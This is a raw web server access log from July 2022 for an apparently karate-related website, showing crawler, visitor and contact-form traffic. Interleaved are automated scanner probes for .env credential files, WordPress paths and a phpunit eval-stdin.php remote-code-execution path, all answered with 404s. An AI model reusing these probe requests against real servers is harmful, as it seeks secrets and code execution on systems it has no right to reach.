::ffff:135.125.246.110 - - [26/Jul/2022:04:56:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [26/Jul/2022:04:56:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:04:59:03 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.158.169.183 - - [26/Jul/2022:05:00:06 +0000] "GET /instructors.html HTTP/1.1" 404 155 "https://www.google.com/" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1"
::ffff:73.158.169.183 - - [26/Jul/2022:05:00:07 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1"
::ffff:73.202.170.82 - - [26/Jul/2022:05:02:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:05:12 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:08:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:11:10 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:14:26 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:17:01 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:143.92.32.15 - - [26/Jul/2022:05:19:09 +0000] "GET /map/baidumap.xml HTTP/1.1" 404 155 "/map/baidumap.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:48 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:54 +0000] "POST /sendemail HTTP/1.1" 302 82 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:55 +0000] "GET /contact/?err=error HTTP/1.1" 200 10572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:55 +0000] "POST /sendemail HTTP/1.1" 302 82 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:56 +0000] "GET /contact/?err=error HTTP/1.1" 200 10572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:19:58 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:04 +0000] "POST /sendemail HTTP/1.1" 302 82 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:04 +0000] "GET /contact/?err=error HTTP/1.1" 200 10572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:05 +0000] "POST /sendemail HTTP/1.1" 302 82 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:05 +0000] "GET /contact/?err=error HTTP/1.1" 200 10572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:07 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:12 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:203.99.123.19 - - [26/Jul/2022:05:20:13 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:20:14 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:23:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.41 - - [26/Jul/2022:05:26:01 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [26/Jul/2022:05:26:15 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:05:28:57 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:151.106.42.32 - - [26/Jul/2022:05:31:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "IDBTE4M CODE87"
::ffff:151.106.42.32 - - [26/Jul/2022:05:31:58 +0000] "POST / HTTP/1.1" 404 140 "-" "IDBTE4M CODE87"
::ffff:73.202.170.82 - - [26/Jul/2022:05:37:06 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:15 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:20 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:21 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:23 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:29 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:30 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:30 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:31 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:32 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:33 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:33 +0000] "GET /2015/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:35 +0000] "GET /2016/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:36 +0000] "GET /2017/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:37 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:37 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:37 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:38 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:39 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:39 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:40 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:40 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:5.62.58.45 - - [26/Jul/2022:05:37:41 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
::ffff:190.12.136.65 - - [26/Jul/2022:05:48:13 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:51.15.195.19 - - [26/Jul/2022:05:50:02 +0000] "HEAD / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36"
::ffff:51.15.195.19 - - [26/Jul/2022:05:50:02 +0000] "HEAD / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36"
::ffff:207.46.13.55 - - [26/Jul/2022:05:53:10 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 200 13988 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.145.194 - - [26/Jul/2022:05:57:57 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:185.254.196.115 - - [26/Jul/2022:05:58:03 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:05:58:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:05:58:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:05:58:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.148.19 - - [26/Jul/2022:06:14:54 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [26/Jul/2022:06:14:55 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:38 +0000] "GET //backend/.env HTTP/1.1" 404 152 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:38 +0000] "GET //envy/.env HTTP/1.1" 404 149 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:38 +0000] "GET //sulu/.env HTTP/1.1" 404 149 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:39 +0000] "GET //bedrock/.env HTTP/1.1" 404 152 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:39 +0000] "GET //dev/.env HTTP/1.1" 404 148 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:141.98.6.62 - - [26/Jul/2022:06:19:39 +0000] "GET //live/.env HTTP/1.1" 404 149 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
::ffff:73.202.170.82 - - [26/Jul/2022:06:23:10 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:162.142.125.213 - - [26/Jul/2022:06:24:05 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:162.142.125.213 - - [26/Jul/2022:06:24:05 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.213 - - [26/Jul/2022:06:24:05 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:40.77.167.66 - - [26/Jul/2022:06:36:01 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:54.36.148.20 - - [26/Jul/2022:06:37:28 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [26/Jul/2022:06:37:29 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:06:39:27 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:185.196.220.70 - - [26/Jul/2022:06:40:53 +0000] "GET / HTTP/1.1" 200 57618 "-" "Linux Gnu (cow)"
::ffff:188.4.51.114 - - [26/Jul/2022:06:43:30 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:66.249.79.176 - - [26/Jul/2022:06:49:36 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:73.202.170.82 - - [26/Jul/2022:06:57:23 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:207.46.13.42 - - [26/Jul/2022:07:05:41 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.135.172 - - [26/Jul/2022:07:06:44 +0000] "GET /joinemail?type=specialclasses HTTP/1.1" 200 8958 "http://www.wadokikai.net/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:27.50.62.50 - - [26/Jul/2022:07:18:57 +0000] "GET /map/baidumap.xml HTTP/1.1" 404 155 "/map/baidumap.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:07:20:35 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:207.46.13.42 - - [26/Jul/2022:07:23:24 +0000] "GET /docs/AlamedaSpring2022PrelimSchedule.pdf HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [26/Jul/2022:07:30:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [26/Jul/2022:07:30:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:73.202.170.82 - - [26/Jul/2022:07:38:31 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:07:45:13 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [26/Jul/2022:07:45:14 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:40.77.167.41 - - [26/Jul/2022:07:50:32 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.202.170.82 - - [26/Jul/2022:07:56:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:167.99.239.140 - - [26/Jul/2022:07:59:04 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::ffff:73.202.170.82 - - [26/Jul/2022:08:11:54 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:207.46.13.55 - - [26/Jul/2022:08:15:33 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:20.29.105.65 - - [26/Jul/2022:08:19:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.29.105.65 - - [26/Jul/2022:08:19:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.29.105.65 - - [26/Jul/2022:08:20:19 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "python-requests/2.25.1"
::ffff:198.235.24.149 - - [26/Jul/2022:08:23:51 +0000] "GET / HTTP/1.1" 200 57618 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:54.36.148.46 - - [26/Jul/2022:08:25:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [26/Jul/2022:08:25:57 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:73.202.170.82 - - [26/Jul/2022:08:29:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:42.83.147.34 - - [26/Jul/2022:08:33:47 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
::ffff:114.119.154.124 - - [26/Jul/2022:08:34:02 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:94.102.61.10 - - [26/Jul/2022:08:42:19 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "python-requests/2.26.0"
::ffff:94.102.61.10 - - [26/Jul/2022:08:42:20 +0000] "GET / HTTP/1.1" 200 57618 "-" "python-requests/2.26.0"
::ffff:73.202.170.82 - - [26/Jul/2022:08:52:50 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
